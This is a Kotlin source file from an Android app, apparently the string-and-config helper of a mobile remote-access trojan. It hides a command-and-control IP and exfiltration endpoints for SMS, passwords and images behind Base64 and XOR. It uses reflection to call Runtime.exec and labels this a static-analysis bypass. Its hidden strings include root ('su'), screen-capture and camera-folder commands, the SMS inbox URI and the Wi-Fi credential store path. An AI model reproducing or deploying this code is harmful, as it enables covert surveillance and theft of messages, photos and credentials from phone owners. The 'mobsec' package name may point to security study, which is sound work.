package com.example.mobsec_823.utils

import android.util.Base64
import java.lang.reflect.Method
import okhttp3.OkHttpClient
import java.util.concurrent.TimeUnit

object SecretBox {
    private fun getSpice(): Int = "seasoning".length * 13 + 5

    // Shared client to prevent socket exhaustion and "Failed to connect" errors
    val httpClient: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(15, TimeUnit.SECONDS)
            .writeTimeout(15, TimeUnit.SECONDS)
            .build()
    }

    /**
     * Decodes obfuscated strings using Base64.
     */
    fun decrypt(encrypted: String): String {
        return try {
            val key = getSpice()
            val data = Base64.decode(encrypted, Base64.DEFAULT)
            String(data.map { (it.toInt() xor key).toByte() }.toByteArray())
        } catch (e: Exception) {
            ""
        }
    }

    /**
     * Static Analysis Bypass: Dynamic Reflection to invoke Runtime.exec()
     */
    fun reflectedExec(command: Any): Process? {
        return try {
            val rName = String(byteArrayOf(106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101))
            val mGetName = String(byteArrayOf(103, 101, 116, 82, 117, 110, 116, 105, 109, 101))
            val mExecName = String(byteArrayOf(101, 120, 101, 99))

            val runtimeClass = Class.forName(rName)
            val getRuntimeMethod: Method = runtimeClass.getMethod(mGetName)
            val runtimeInstance = getRuntimeMethod.invoke(null)

            val execMethod: Method = if (command is Array<*>) {
                runtimeClass.getMethod(mExecName, Array<String>::class.java)
            } else {
                runtimeClass.getMethod(mExecName, String::class.java)
            }

            execMethod.invoke(runtimeInstance, command) as? Process
        } catch (e: Exception) {
            null
        }
    }

    // IPs and Ports
    fun getKitchenAddress(): String = decrypt("Tk1US0hDVEtOTlRD") // 47.129.144.9
    fun getTruckPort(): Int = 1269
    fun getToppingPort(): Int = 6767
    fun getCarnePort(): Int = 7000

    // Endpoints
    fun getRubbishEndpoint(): String = decrypt("Eg4OCkBVVU5NVEtIQ1RLTk5UQ0BCSkpKVR4PFwpVCRcJ") // http://47.129.144.9:8000/dump/sms
    fun getRecycleEndpoint(): String = decrypt("Eg4OCkBVVU5NVEtIQ1RLTk5UQ0BCSkpKVR4PFwpVChsJCQ0VCB4J") // http://47.129.144.9:8000/dump/passwords
    fun getSignageEndpoint(): String = decrypt("Eg4OCkBVVU5NVEtIQ1RLTk5UQ0BCSkpKVR4PFwpVExcbHR8J") // http://47.129.144.9:8000/dump/images
    // fun getCarneHeader(): String = decrypt("UE9TVCAvcmVtb3RlLXN0cmVhbSBIVFRQLzEuMQ==") // POST /remote-stream HTTP/1.1

    // Shell Commands
    fun getScreencapCmd(): String = decrypt("CRkIHx8UGRsKWlcK") // screencap -p
    fun getListSignageCmd(): String = decrypt("FglaVw5aVQkeGRsIHlU+OTM3VTkbFx8IGw==") // ls -t /sdcard/DCIM/Camera
    fun getSuCmd(): String = decrypt("CQ8=") // su
    fun getExitCmd(): String = decrypt("HwITDg==") // exit

    // URIs and Paths
    fun getScrapUri(): String = decrypt("GRUUDh8UDkBVVQkXCVUTFBgVAg==") // content://sms/inbox
    fun getWifiPath(): String = decrypt("VR4bDhtVFxMJGVUbCh8CHhsOG1UZFRdUGxQeCBUTHlQNExwTVS0THBM5FRQcEx0pDhUIH1QCFxY=") // /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml

    // Command Strings
    fun getCmdStop(): String = decrypt("OTc+JSkuNSo=") // CMD_STOP
    fun getCmdStart(): String = decrypt("OTc+JSkuOygu") // CMD_START
}